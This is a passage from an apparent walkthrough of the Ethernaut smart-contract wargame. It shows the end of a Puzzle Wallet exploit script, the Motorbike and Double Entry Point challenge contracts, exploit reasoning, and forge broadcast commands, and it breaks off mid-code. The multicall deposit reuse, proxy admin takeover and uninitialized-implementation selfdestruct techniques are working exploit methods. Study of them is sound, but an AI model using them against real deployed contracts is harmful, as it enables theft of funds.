        <span class="nx">_nestedMulti</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSelector</span><span class="p">(</span><span class="nx">wallet</span><span class="p">.</span><span class="nx">multicall</span><span class="p">.</span><span class="nx">selector</span><span class="p">,</span> <span class="nx">_depositSelector</span><span class="p">);</span>  <span class="c1">// multicall calldata</span>
        <span class="c1">// [deposit selector, multicall selector [deposit] ]</span>
        <span class="nx">wallet</span><span class="p">.</span><span class="nx">multicall</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mf">0.001</span> <span class="nx">ether</span><span class="p">}(</span><span class="nx">_nestedMulti</span><span class="p">);</span>

        <span class="c1">// Wallet Balance : 0.002 ETH</span>
        <span class="c1">// Balance[msg.sender] = Balance[Attacker] = 0.003 ETH</span>

        <span class="c1">// Call Execute function with amount 0.002</span>

        <span class="nx">wallet</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="mf">0.002</span> <span class="nx">ether</span><span class="p">,</span> <span class="dl">""</span><span class="p">);</span>


        <span class="c1">// Now Wallet Balance ==&gt; 0</span>

        <span class="c1">// wallet.setMaxBalance(uint256(uint160(address(this))));</span>
        
        <span class="nx">wallet</span><span class="p">.</span><span class="nf">setMaxBalance</span><span class="p">(</span><span class="nf">uint256</span><span class="p">(</span><span class="nf">uint160</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="mh">0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602</span><span class="p">))));</span> <span class="c1">// sets proxyAdmin</span>
    <span class="p">}</span>

    <span class="nf">receive</span><span class="p">()</span> <span class="nx">payable</span> <span class="nx">external</span><span class="p">{}</span>
<span class="p">}</span>
<span class="cm">/*
            // Proxy                            // Wallet
        address public pendingAdmin;    |  address public owner;
        address public admin;           |  uint256 public maxBalance;
*/</span>

</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/PuzzleWalletSolve.s.sol:PuzzleWalletSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="25-motorbike">25 Motorbike</h1>

<p><code class="language-plaintext highlighter-rouge">Motorbike.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>

<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">&lt;</span><span class="mf">0.7</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">openzeppelin-contracts-06/utils/Address.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">openzeppelin-contracts-06/proxy/Initializable.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Motorbike</span> <span class="p">{</span>
    <span class="c1">// keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1</span>
    <span class="nx">bytes32</span> <span class="nx">internal</span> <span class="nx">constant</span> <span class="nx">_IMPLEMENTATION_SLOT</span> <span class="o">=</span> <span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span>
    
    <span class="nx">struct</span> <span class="nx">AddressSlot</span> <span class="p">{</span>
        <span class="nx">address</span> <span class="nx">value</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="c1">// Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span>
    <span class="nf">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_logic</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">Address</span><span class="p">.</span><span class="nf">isContract</span><span class="p">(</span><span class="nx">_logic</span><span class="p">),</span> <span class="dl">"</span><span class="s2">ERC1967: new implementation is not a contract</span><span class="dl">"</span><span class="p">);</span>
        <span class="nf">_getAddressSlot</span><span class="p">(</span><span class="nx">_IMPLEMENTATION_SLOT</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">_logic</span><span class="p">;</span>
        <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,)</span> <span class="o">=</span> <span class="nx">_logic</span><span class="p">.</span><span class="nf">delegatecall</span><span class="p">(</span>
            <span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">initialize()</span><span class="dl">"</span><span class="p">)</span>
        <span class="p">);</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Call failed</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Delegates the current call to `implementation`.</span>
    <span class="kd">function</span> <span class="nf">_delegate</span><span class="p">(</span><span class="nx">address</span> <span class="nx">implementation</span><span class="p">)</span> <span class="nx">internal</span> <span class="nx">virtual</span> <span class="p">{</span>
        <span class="c1">// solhint-disable-next-line no-inline-assembly</span>
        <span class="nx">assembly</span> <span class="p">{</span>
            <span class="nf">calldatacopy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nf">calldatasize</span><span class="p">())</span>
            <span class="kd">let</span> <span class="nx">result</span> <span class="p">:</span><span class="o">=</span> <span class="nf">delegatecall</span><span class="p">(</span><span class="nf">gas</span><span class="p">(),</span> <span class="nx">implementation</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nf">calldatasize</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
            <span class="nf">returndatacopy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nf">returndatasize</span><span class="p">())</span>
            <span class="k">switch</span> <span class="nx">result</span>
            <span class="k">case</span> <span class="mi">0</span> <span class="p">{</span> <span class="nf">revert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">returndatasize</span><span class="p">())</span> <span class="p">}</span>
            <span class="k">default</span> <span class="p">{</span> <span class="nf">return</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">returndatasize</span><span class="p">())</span> <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// Fallback function that delegates calls to the address returned by `_implementation()`. </span>
    <span class="c1">// Will run if no other function in the contract matches the call data</span>
    <span class="nf">fallback </span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="nx">virtual</span> <span class="p">{</span>
        <span class="nf">_delegate</span><span class="p">(</span><span class="nf">_getAddressSlot</span><span class="p">(</span><span class="nx">_IMPLEMENTATION_SLOT</span><span class="p">).</span><span class="nx">value</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Returns an `AddressSlot` with member `value` located at `slot`.</span>
    <span class="kd">function</span> <span class="nf">_getAddressSlot</span><span class="p">(</span><span class="nx">bytes32</span> <span class="nx">slot</span><span class="p">)</span> <span class="nx">internal</span> <span class="nx">pure</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">AddressSlot</span> <span class="nx">storage</span> <span class="nx">r</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">assembly</span> <span class="p">{</span>
            <span class="nl">r_slot</span> <span class="p">:</span><span class="o">=</span> <span class="nx">slot</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Engine</span> <span class="nx">is</span> <span class="nx">Initializable</span> <span class="p">{</span>
    <span class="c1">// keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1</span>
    <span class="nx">bytes32</span> <span class="nx">internal</span> <span class="nx">constant</span> <span class="nx">_IMPLEMENTATION_SLOT</span> <span class="o">=</span> <span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span>

    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">upgrader</span><span class="p">;</span>
    <span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">horsePower</span><span class="p">;</span>

    <span class="nx">struct</span> <span class="nx">AddressSlot</span> <span class="p">{</span>
        <span class="nx">address</span> <span class="nx">value</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">initialize</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">initializer</span> <span class="p">{</span>
        <span class="nx">horsePower</span> <span class="o">=</span> <span class="mi">1000</span><span class="p">;</span>
        <span class="nx">upgrader</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Upgrade the implementation of the proxy to `newImplementation`</span>
    <span class="c1">// subsequently execute the function call</span>
    <span class="kd">function</span> <span class="nf">upgradeToAndCall</span><span class="p">(</span><span class="nx">address</span> <span class="nx">newImplementation</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">data</span><span class="p">)</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="nf">_authorizeUpgrade</span><span class="p">();</span>
        <span class="nf">_upgradeToAndCall</span><span class="p">(</span><span class="nx">newImplementation</span><span class="p">,</span> <span class="nx">data</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Restrict to upgrader role</span>
    <span class="kd">function</span> <span class="nf">_authorizeUpgrade</span><span class="p">()</span> <span class="nx">internal</span> <span class="nx">view</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">upgrader</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Can't upgrade</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span>
    <span class="kd">function</span> <span class="nf">_upgradeToAndCall</span><span class="p">(</span>
        <span class="nx">address</span> <span class="nx">newImplementation</span><span class="p">,</span>
        <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">data</span>
    <span class="p">)</span> <span class="nx">internal</span> <span class="p">{</span>
        <span class="c1">// Initial upgrade and setup call</span>
        <span class="nf">_setImplementation</span><span class="p">(</span><span class="nx">newImplementation</span><span class="p">);</span>
        <span class="nf">if </span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,)</span> <span class="o">=</span> <span class="nx">newImplementation</span><span class="p">.</span><span class="nf">delegatecall</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
            <span class="nf">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Call failed</span><span class="dl">"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    
    <span class="c1">// Stores a new address in the EIP1967 implementation slot.</span>
    <span class="kd">function</span> <span class="nf">_setImplementation</span><span class="p">(</span><span class="nx">address</span> <span class="nx">newImplementation</span><span class="p">)</span> <span class="kr">private</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">Address</span><span class="p">.</span><span class="nf">isContract</span><span class="p">(</span><span class="nx">newImplementation</span><span class="p">),</span> <span class="dl">"</span><span class="s2">ERC1967: new implementation is not a contract</span><span class="dl">"</span><span class="p">);</span>
        
        <span class="nx">AddressSlot</span> <span class="nx">storage</span> <span class="nx">r</span><span class="p">;</span>
        <span class="nx">assembly</span> <span class="p">{</span>
            <span class="nl">r_slot</span> <span class="p">:</span><span class="o">=</span> <span class="nx">_IMPLEMENTATION_SLOT</span>
        <span class="p">}</span>
        <span class="nx">r</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">newImplementation</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>Would you be able to selfdestruct its engine and make the motorbike unusable ?</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>This is another upgradeable proxy contract setup. Motorbike contract is the proxy contract which forwards the calls to the implementation contract Engine.</li>
  <li>This time no storage collison is happened.</li>
  <li>We need to change the <code class="language-plaintext highlighter-rouge">updrader</code> of the Engine contract and <code class="language-plaintext highlighter-rouge">selfdestruct</code> the Engine contract.</li>
  <li>I dont see any function that selfdestructs Engine contract. So, we have to write an Attack contract which has the selfdestruct function and change the implementation address.</li>
  <li>We see only one time the <code class="language-plaintext highlighter-rouge">upgrader</code> was assigned inside Engine contract, that is inside <code class="language-plaintext highlighter-rouge">initialize()</code> function. And this initialize function was called inside the constructor of the Motobike.</li>
  <li>But observe that this call was done using <code class="language-plaintext highlighter-rouge">delegatecall</code>, which is done in the context of the Motorbike. Not the Engine contract.</li>
  <li>This means the <code class="language-plaintext highlighter-rouge">initialize()</code> function can be called again as the <code class="language-plaintext highlighter-rouge">intializer</code> modfier not updated.</li>
  <li>By calling <code class="language-plaintext highlighter-rouge">intialize()</code> we will become the updrader of the Engine contract.</li>
  <li>Now, we can update the implementation addres by calling <code class="language-plaintext highlighter-rouge">upgradeToAndCall()</code> function and pass the data as the signature of the <code class="language-plaintext highlighter-rouge">destructEngine()</code> function to be called by the Engine contract.</li>
  <li>This will destruct the Engine contract, because the call was done using <code class="language-plaintext highlighter-rouge">delegatecall</code> so the storage of the Engine will be affected.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">MotorbikeSolve.s.sol</code></p>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/MotorbikeSolve.s.sol:MotorbikeSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="26-double-entry-point">26 Double Entry Point</h1>

<p><code class="language-plaintext highlighter-rouge">DoubleEntryPoint.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">openzeppelin-contracts/contracts/access/Ownable.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">openzeppelin-contracts/contracts/token/ERC20/ERC20.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="kr">interface</span> <span class="nx">DelegateERC20</span> <span class="p">{</span>
  <span class="kd">function</span> <span class="nf">delegateTransfer</span><span class="p">(</span><span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">origSender</span><span class="p">)</span> <span class="nx">external</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">);</span>
<span class="p">}</span>

<span class="kr">interface</span> <span class="nx">IDetectionBot</span> <span class="p">{</span>
    <span class="kd">function</span> <span class="nf">handleTransaction</span><span class="p">(</span><span class="nx">address</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">calldata</span> <span class="nx">msgData</span><span class="p">)</span> <span class="nx">external</span><span class="p">;</span>
<span class="p">}</span>

<span class="kr">interface</span> <span class="nx">IForta</span> <span class="p">{</span>
    <span class="kd">function</span> <span class="nf">setDetectionBot</span><span class="p">(</span><span class="nx">address</span> <span class="nx">detectionBotAddress</span><span class="p">)</span> <span class="nx">external</span><span class="p">;</span>
    <span class="kd">function</span> <span class="nf">notify</span><span class="p">(</span><span class="nx">address</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">calldata</span> <span class="nx">msgData</span><span class="p">)</span> <span class="nx">external</span><span class="p">;</span>
    <span class="kd">function</span> <span class="nf">raiseAlert</span><span class="p">(</span><span class="nx">address</span> <span class="nx">user</span><span class="p">)</span> <span class="nx">external</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Forta</span> <span class="nx">is</span> <span class="nx">IForta</span> <span class="p">{</span>
  <span class="nf">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">IDetectionBot</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">usersDetectionBots</span><span class="p">;</span>
  <span class="nf">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint256</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">botRaisedAlerts</span><span class="p">;</span>

  <span class="kd">function</span> <span class="nf">setDetectionBot</span><span class="p">(</span><span class="nx">address</span> <span class="nx">detectionBotAddress</span><span class="p">)</span> <span class="nx">external</span> <span class="nx">override</span> <span class="p">{</span>
      <span class="nx">usersDetectionBots</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">=</span> <span class="nc">IDetectionBot</span><span class="p">(</span><span class="nx">detectionBotAddress</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">notify</span><span class="p">(</span><span class="nx">address</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">calldata</span> <span class="nx">msgData</span><span class="p">)</span> <span class="nx">external</span> <span class="nx">override</span> <span class="p">{</span>
    <span class="nf">if</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">usersDetectionBots</span><span class="p">[</span><span class="nx">user</span><span class="p">])</span> <span class="o">==</span> <span class="nf">address</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="k">return</span><span class="p">;</span>
    <span class="k">try</span> <span class="nx">usersDetectionBots</span><span class="p">[</span><span class="nx">user</span><span class="p">].</span><span class="nf">handleTransaction</span><span class="p">(</span><span class="nx">user</span><span class="p">,</span> <span class="nx">msgData</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">raiseAlert</span><span class="p">(</span><span class="nx">address</span> <span class="nx">user</span><span class="p">)</span> <span class="nx">external</span> <span class="nx">override</span> <span class="p">{</span>
      <span class="nf">if</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">usersDetectionBots</span><span class="p">[</span><span class="nx">user</span><span class="p">])</span> <span class="o">!=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
      <span class="nx">botRaisedAlerts</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span> 
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">CryptoVault</span> <span class="p">{</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">sweptTokensRecipient</span><span class="p">;</span>
    <span class="nx">IERC20</span> <span class="kr">public</span> <span class="nx">underlying</span><span class="p">;</span>

    <span class="nf">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">recipient</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">sweptTokensRecipient</span> <span class="o">=</span> <span class="nx">recipient</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">setUnderlying</span><span class="p">(</span><span class="nx">address</span> <span class="nx">latestToken</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">underlying</span><span class="p">)</span> <span class="o">==</span> <span class="nf">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="dl">"</span><span class="s2">Already set</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">underlying</span> <span class="o">=</span> <span class="nc">IERC20</span><span class="p">(</span><span class="nx">latestToken</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/*
    ...
    */</span>

    <span class="kd">function</span> <span class="nf">sweepToken</span><span class="p">(</span><span class="nx">IERC20</span> <span class="nx">token</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">token</span> <span class="o">!=</span> <span class="nx">underlying</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Can't transfer underlying token</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">token</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nx">sweptTokensRecipient</span><span class="p">,</span> <span class="nx">token</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">LegacyToken</span> <span class="nx">is</span> <span class="nc">ERC20</span><span class="p">(</span><span class="dl">"</span><span class="s2">LegacyToken</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">LGT</span><span class="dl">"</span><span class="p">),</span> <span class="nc">Ownable</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// added address(0) to escape compiler errors</span>
    <span class="nx">DelegateERC20</span> <span class="kr">public</span> <span class="nx">delegate</span><span class="p">;</span>

    <span class="kd">function</span> <span class="nf">mint</span><span class="p">(</span><span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">amount</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
        <span class="nf">_mint</span><span class="p">(</span><span class="nx">to</span><span class="p">,</span> <span class="nx">amount</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">delegateToNewContract</span><span class="p">(</span><span class="nx">DelegateERC20</span> <span class="nx">newContract</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
        <span class="nx">delegate</span> <span class="o">=</span> <span class="nx">newContract</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">value</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">override</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
        <span class="nf">if </span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">delegate</span><span class="p">)</span> <span class="o">==</span> <span class="nf">address</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="k">super</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nx">to</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">delegate</span><span class="p">.</span><span class="nf">delegateTransfer</span><span class="p">(</span><span class="nx">to</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">DoubleEntryPoint</span> <span class="nx">is</span> <span class="nc">ERC20</span><span class="p">(</span><span class="dl">"</span><span class="s2">DoubleEntryPointToken</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">DET</span><span class="dl">"</span><span class="p">),</span> <span class="nx">DelegateERC20</span><span class="p">,</span> <span class="nc">Ownable </span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// added address(0) to escape compiler errors</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">cryptoVault</span><span class="p">;</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">player</span><span class="p">;</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">delegatedFrom</span><span class="p">;</span>
    <span class="nx">Forta</span> <span class="kr">public</span> <span class="nx">forta</span><span class="p">;</span>

    <span class="nf">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">legacyToken</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">vaultAddress</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">fortaAddress</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">playerAddress</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">delegatedFrom</span> <span class="o">=</span> <span class="nx">legacyToken</span><span class="p">;</span>
        <span class="nx">forta</span> <span class="o">=</span> <span class="nc">Forta</span><span class="p">(</span><span class="nx">fortaAddress</span><span class="p">);</span>
        <span class="nx">player</span> <span class="o">=</span> <span class="nx">playerAddress</span><span class="p">;</span>
        <span class="nx">cryptoVault</span> <span class="o">=</span> <span class="nx">vaultAddress</span><span class="p">;</span>
        <span class="nf">_mint</span><span class="p">(</span><span class="nx">cryptoVault</span><span class="p">,</span> <span class="mi">100</span> <span class="nx">ether</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="nx">modifier</span> <span class="nf">onlyDelegateFrom</span><span class="p">()</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">delegatedFrom</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Not legacy contract</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">_</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nx">modifier</span> <span class="nf">fortaNotify</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">address</span> <span class="nx">detectionBot</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="nx">forta</span><span class="p">.</span><span class="nf">usersDetectionBots</span><span class="p">(</span><span class="nx">player</span><span class="p">));</span>

        <span class="c1">// Cache old number of bot alerts</span>
        <span class="nx">uint256</span> <span class="nx">previousValue</span> <span class="o">=</span> <span class="nx">forta</span><span class="p">.</span><span class="nf">botRaisedAlerts</span><span class="p">(</span><span class="nx">detectionBot</span><span class="p">);</span>

        <span class="c1">// Notify Forta</span>
        <span class="nx">forta</span><span class="p">.</span><span class="nf">notify</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>

        <span class="c1">// Continue execution</span>
        <span class="nx">_</span><span class="p">;</span>

        <span class="c1">// Check if alarms have been raised</span>
        <span class="nf">if</span><span class="p">(</span><span class="nx">forta</span><span class="p">.</span><span class="nf">botRaisedAlerts</span><span class="p">(</span><span class="nx">detectionBot</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">previousValue</span><span class="p">)</span> <span class="nf">revert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Alert has been triggered, reverting</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">delegateTransfer</span><span class="p">(</span>
        <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span>
        <span class="nx">uint256</span> <span class="nx">value</span><span class="p">,</span>
        <span class="nx">address</span> <span class="nx">origSender</span>
    <span class="p">)</span> <span class="kr">public</span> <span class="nx">override</span> <span class="nx">onlyDelegateFrom</span> <span class="nx">fortaNotify</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
        <span class="nf">_transfer</span><span class="p">(</span><span class="nx">origSender</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>Drain the underlying token balance of CryptoVault and Write a detection bot to catch this bug.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>There are four contract in total CryptoVault, DoubleEntryPoint, LegacyToken and Forta.</li>
  <li>CryptoVault implemented <code class="language-plaintext highlighter-rouge">sweepToken()</code> function which allows us to sweep all the tokens from the CryptoVault except the <code class="language-plaintext highlighter-rouge">underlying</code> tokens.</li>
  <li>The underlying token is an instance of the DET token implemented in the DoubleEntryPoint contract definition and the CryptoVault holds 100 units of it. Additionally the CryptoVault also holds 100 of LegacyToken LGT.</li>
  <li>LegacyToken is simple ERC20 token which is already deployed and minted 100 tokens for the CryptoVault.</li>
  <li>LegacyToken also have function <code class="language-plaintext highlighter-rouge">transfer()</code> which is where the catch is,
    <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">value</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">override</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
